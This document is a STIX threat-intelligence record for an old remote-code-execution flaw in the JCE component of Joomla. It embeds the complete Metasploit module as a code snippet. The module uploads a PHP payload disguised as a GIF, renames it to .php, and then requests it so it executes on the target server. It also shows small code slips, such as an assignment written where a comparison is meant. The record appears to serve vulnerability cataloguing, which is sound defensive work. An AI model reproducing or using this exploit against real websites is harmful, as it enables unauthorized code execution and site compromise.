{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ab93119-e1a6-4be3-a702-fb3a56055d59",
    "created": "2024-08-14T17:12:01.271026Z",
    "modified": "2024-08-14T17:12:01.27103Z",
    "name": "Joomla Component JCE File Upload Remote Code Execution",
    "description": " This module exploits a vulnerability in the JCE component for Joomla!, which could allow an unauthenticated remote attacker to upload arbitrary files, caused by the fails to sufficiently sanitize user-supplied input. Sending specially-crafted HTTP request, a remote attacker could exploit this vulnerability to upload a malicious PHP script, which could allow the attacker to execute arbitrary PHP code on the vulnerable system. This module has been tested successfully on the JCE Editor 1.5.71 and Joomla 1.5.26. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/joomla_comjce_imgmanager.rb",
            "external_id": "joomla_comjce_imgmanager.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Joomla Component JCE File Upload Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the JCE component for Joomla!, which\n      could allow an unauthenticated remote attacker to upload arbitrary files, caused by the\n      fails to sufficiently sanitize user-supplied input. Sending specially-crafted HTTP\n      request, a remote attacker could exploit this vulnerability to upload a malicious PHP\n      script, which could allow the attacker to execute arbitrary PHP code on the vulnerable\n      system. This module has been tested successfully on the JCE Editor 1.5.71 and Joomla\n      1.5.26.\n      },\n      'Author'         =>\n        [\n          'Unknown', # From AmnPardaz Security Group # Vulnerability discovery and PoC\n          'Heyder Andrade <eu[at]heyderandrade.org>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '74839'],\n          ['EDB', '17734'],\n          ['BID', '49338']\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 4000, # only to prevent error HTTP 414 (Request-URI Too Long)\n          'DisableNops' => true,\n          'BadChars'    => \"#\",\n          'Keys'        => ['php']\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-02',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, \"Joomla directory path\", \"/\"])\n        ])\n  end\n\n\n  def get_version\n    # check imgmanager version\n    @uri_base \t\t= normalize_uri(target_uri.path.to_s, 'index.php')\n    @vars_get_base \t=  \t{\n      'option'=> 'com_jce',\n      'task'  => 'plugin',\n      'plugin'=> 'imgmanager',\n      'file'  => 'imgmanager'\n    }\n    print_status(\"Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    res = send_request_cgi({\n      'uri' \t  => @uri_base,\n      'vars_get' => @vars_get_base,\n      'method'  => 'GET',\n      'version' => '1.1'\n    })\n\n    version = nil\n    if (res and res.code == 200)\n      res.body.match(%r{^\\s+?<title>Image\\sManager\\s:\\s?(.*)<})\n      version = $1.nil? ? nil : $1\n    end\n\n    return version\n  end\n\n  def check\n    version = ( get_version || '').to_s\n\n    if (version.match(%r{1\\.5\\.7\\.1[0-4]?}))\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def upload_gif\n    # add GIF header\n    cmd_php = \"GIF89aG\\n<?php #{payload.encoded}  ?>\"\n\n    # Generate some random strings\n    @payload_name  \t= rand_text_alpha_lower(6)\n    boundary   \t\t= '-' * 27 + rand_text_numeric(11)\n\n    parms \t\t\t= {'method'=> 'form'}\n    parms.merge!(@vars_get_base)\n\n    # POST data\n    post_data = Rex::MIME::Message.new\n    post_data.bound = boundary\n    post_data.add_part(\"/\", nil, nil, \"form-data; name=\\\"upload-dir\\\"\")\n    post_data.add_part(\"\", \"application/octet-stream\", nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"\\\"\")\n    post_data.add_part(\"0\", nil, nil, \"form-data; name=\\\"upload-overwrite\\\"\")\n    post_data.add_part(\"#{cmd_php}\", \"image/gif\", nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{@payload_name}.gif\\\"\")\n    post_data.add_part(\"#{@payload_name}\", nil, nil, \"form-data; name=\\\"upload-name\\\"\")\n    post_data.add_part(\"upload\", nil, nil, \"form-data; name=\\\"action\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'\t  \t=> @uri_base,\n      'vars_get' \t=> parms,\n      'method'  \t=> 'POST',\n      'version' \t=> '1.1',\n      'data'    \t=> data,\n      'ctype'  \t=> \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    if (res and res.code = 200 )\n      return :access_denied if (res.body =~ /RESTRICTED/i)\n      print_good(\"Successfully uploaded #{@payload_name}.gif\")\n    else\n      print_error(\"Error uploading #{@payload_name}.gif\")\n      return :abort\n    end\n\n    return :success\n\n  end\n\n  def renamed?\n    # Rename the file from .gif to .php\n\n    data =\t\"json={\\\"fn\\\":\\\"folderRename\\\",\\\"args\\\":[\\\"/#{@payload_name}.gif\\\",\\\"#{@payload_name}.php\\\"]}\"\n\n    print_status(\"Change Extension from #{@payload_name}.gif to #{@payload_name}.php\")\n\n    res = send_request_cgi(\n      {\n        'uri'       => @uri_base,\n        'vars_get'\t=> @vars_get_base,\n        'method'    => 'POST',\n        'version'   => '1.1',\n        'data' \t    => data,\n        'ctype'     => 'application/x-www-form-urlencoded; charset=utf-8',\n        'headers'   =>\n        {\n          'X-Request' => 'JSON'\n        }\n      })\n    if (res and res.code == 200 )\n      print_good(\"Renamed #{@payload_name}.gif to #{@payload_name}.php\")\n      return true\n    else\n      print_error(\"Failed to rename #{@payload_name}.gif to #{@payload_name}.php\")\n      return false\n    end\n  end\n\n  def call_payload\n    payload = \"#{@payload_name}.php\"\n    print_status(\"Calling payload: #{payload}\")\n    uri = normalize_uri(target_uri.path.to_s, \"images\", \"stories\", payload)\n    res = send_request_cgi({\n      'uri'\t=> uri,\n      'method'    => 'GET',\n      'version'   => '1.1'\n    })\n  end\n\n\n\n  def exploit\n\n    return if not check == Exploit::CheckCode::Vulnerable\n    if upload_gif == :success\n      if renamed?\n        register_files_for_cleanup(\"#{@payload_name}.php\")\n        call_payload\n      end\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-02",
    "x_mitre_platforms": [
        "php'"
    ]
}